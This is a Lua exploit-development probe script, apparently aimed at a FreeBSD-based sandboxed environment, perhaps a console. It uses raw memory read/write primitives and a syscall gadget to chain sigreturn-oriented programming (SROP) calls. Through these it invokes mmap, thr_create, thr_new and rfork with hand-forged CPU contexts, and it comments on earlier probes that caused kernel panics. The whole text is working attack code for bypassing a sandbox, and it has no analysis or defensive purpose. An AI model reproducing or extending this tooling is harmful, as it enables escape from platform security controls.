-- CRASH_CLASS: RISKY
-- PROBE 133b: thr_create by cloning current context
--
-- 133a proved CS=0x43 prevents kernel panic, but returned -1 with TID.
-- Theory: building context from scratch missed FPU state, stack info, etc.
-- New approach: getcontext to capture FULL valid state, copy it, then
-- modify only RIP/RAX/RSP for the thread.

print("=== PROBE 133b: THR_CREATE CLONE CONTEXT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

--------------------------------------------------------------------
-- SECTION A: Dump current context to understand the structure
--------------------------------------------------------------------
print("")
print("--- [A] Current context dump ---")
pcall(function() return sc_gc(uint64(ctx)) end)

-- Dump all fields
for off = 0, 0x1FF, 8 do
    local v = memory.read_qword(ctx + off)
    local vh, vl = get_hi_lo(v)
    if vh ~= 0 or vl ~= 0 then
        print(string.format("  ctx+0x%03X: %s", off, hex(v)))
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Clone context approach
--------------------------------------------------------------------
print("")
print("--- [B] Clone context for thread ---")

-- Capture a fresh context
pcall(function() return sc_gc(uint64(ctx)) end)

-- Allocate thread context and copy the entire current context
local thr_ctx = gpu + 0x1000
for off = 0, 0x4FF, 8 do
    local v = memory.read_qword(ctx + off)
    memory.write_qword(thr_ctx + off, v)
end

-- Allocate thread stack
local thr_stack_base = gpu + 0x6000
local thr_stack_top = thr_stack_base + 0x3FF0

-- Thread ID output
local thr_id = gpu + 0xA000
memory.write_qword(thr_id, uint64(0))

-- Modify ONLY the thread-specific fields
local T = thr_ctx + MC

-- RIP = syscall instruction (thread will execute syscall with RAX)
memory.write_qword(T + 0xA0, sc_addr)

-- RAX = 431 (thr_exit) — thread immediately exits
memory.write_qword(T + 0x38, uint64(431))

-- RDI = 0 (exit status for thr_exit)
memory.write_qword(T + 0x08, uint64(0))

-- RSP = thread's own stack (IMPORTANT: must be different from main thread)
local stack_addr = uint64(string.format("0x%X", to_num(thr_stack_top)))
memory.write_qword(T + 0xB8, stack_addr)

-- Verify CS/SS are correct (should be inherited from clone)
print("[B] thread CS=" .. hex(memory.read_qword(T + 0xA8)))
print("[B] thread SS=" .. hex(memory.read_qword(T + 0xC0)))
print("[B] thread RIP=" .. hex(memory.read_qword(T + 0xA0)))
print("[B] thread RSP=" .. hex(memory.read_qword(T + 0xB8)))
print("[B] thread RFLAGS=" .. hex(memory.read_qword(T + 0xB0)))
print("[B] mc_len=" .. hex(memory.read_qword(T + 0xC8)))

-- Fire thr_create
local thr_ctx_addr = uint64(string.format("0x%X", to_num(thr_ctx)))
local thr_id_addr = uint64(string.format("0x%X", to_num(thr_id)))
print("[B] FIRING thr_create...")
local rv_thr = srop(430, thr_ctx_addr, thr_id_addr, uint64(0))
print("[B] rv=" .. hex(rv_thr))
print("[B] ALIVE pid=" .. to_num(sc20()))
print("[B] tid=" .. hex(memory.read_qword(thr_id)))

local rvh, rvl = get_hi_lo(rv_thr)

--------------------------------------------------------------------
-- SECTION C: Try thr_new(455) instead of thr_create(430)
--------------------------------------------------------------------
print("")
print("--- [C] thr_new(455) ---")

-- thr_new takes a thr_param struct, not a ucontext
-- struct thr_param {
--   void (*start_func)(void *);  // +0x00
--   void *arg;                    // +0x08
--   char *stack_base;             // +0x10
--   size_t stack_size;            // +0x18
--   char *tls_base;               // +0x20
--   size_t tls_size;              // +0x28
--   long *child_tid;              // +0x30
--   long *parent_tid;             // +0x38
--   int flags;                    // +0x40
--   struct rtprio *rtp;           // +0x48
--   void *spare[3];               // +0x50
-- }

local thr_param = gpu + 0xB000
for off = 0, 0x7F, 4 do
    memory.write_dword(thr_param + off, 0)
end

-- start_func: point to the syscall gadget address
-- The thread will call this function, which is the syscall instruction
-- But this won't work directly because the function needs a proper prologue
-- Let's try anyway
memory.write_qword(thr_param + 0x00, sc_addr)  -- start_func
memory.write_qword(thr_param + 0x08, uint64(0))  -- arg
memory.write_qword(thr_param + 0x10, uint64(string.format("0x%X", to_num(thr_stack_base))))  -- stack_base
memory.write_qword(thr_param + 0x18, uint64(0x4000))  -- stack_size
memory.write_qword(thr_param + 0x30, thr_id_addr)  -- child_tid
memory.write_qword(thr_param + 0x38, thr_id_addr)  -- parent_tid

memory.write_qword(thr_id, uint64(0))

local param_addr = uint64(string.format("0x%X", to_num(thr_param)))
local rv_tn = srop(455, param_addr, uint64(0x68))
print("[C] thr_new rv=" .. hex(rv_tn))
print("[C] ALIVE pid=" .. to_num(sc20()))
print("[C] tid=" .. hex(memory.read_qword(thr_id)))

--------------------------------------------------------------------
-- SECTION D: Try rfork(251) via SROP
--------------------------------------------------------------------
print("")
print("--- [D] rfork(251) via SROP ---")

-- RFPROC=0x10, RFTHREAD=0x2000, RFMEM=0x20
-- RFTHREAD|RFMEM = share everything, create thread
local rv_rf = srop(251, uint64(0x2010))
print("[D] rfork(RFPROC|RFTHREAD)=" .. hex(rv_rf))
print("[D] ALIVE pid=" .. to_num(sc20()))

-- Just RFPROC
local rv_rf2 = srop(251, uint64(0x10))
print("[D] rfork(RFPROC)=" .. hex(rv_rf2))
print("[D] ALIVE pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: Check errno via raw syscall return
-- FreeBSD: on error, RAX=errno (positive), CF set
-- Capture RAX directly from the returned context
--------------------------------------------------------------------
print("")
print("--- [E] Raw errno from thr_create ---")

-- Do thr_create again but check raw return more carefully
pcall(function() return sc_gc(uint64(ctx)) end)

-- Copy context for thread
for off = 0, 0x4FF, 8 do
    local v = memory.read_qword(ctx + off)
    memory.write_qword(thr_ctx + off, v)
end
memory.write_qword(T + 0xA0, sc_addr)
memory.write_qword(T + 0x38, uint64(431))
memory.write_qword(T + 0x08, uint64(0))
memory.write_qword(T + 0xB8, stack_addr)
memory.write_qword(thr_id, uint64(0))

-- Fire thr_create via make_syscall directly (not SROP) to see real return
local sc430 = make_syscall(430)
local ok430, rv430 = pcall(function()
    return sc430(thr_ctx_addr, thr_id_addr, uint64(0))
end)
print("[E] make_syscall(430) ok=" .. tostring(ok430) .. " rv=" .. hex(rv430))
print("[E] tid=" .. hex(memory.read_qword(thr_id)))
print("[E] ALIVE pid=" .. to_num(sc20()))

print("")
print("=== DONE ===")
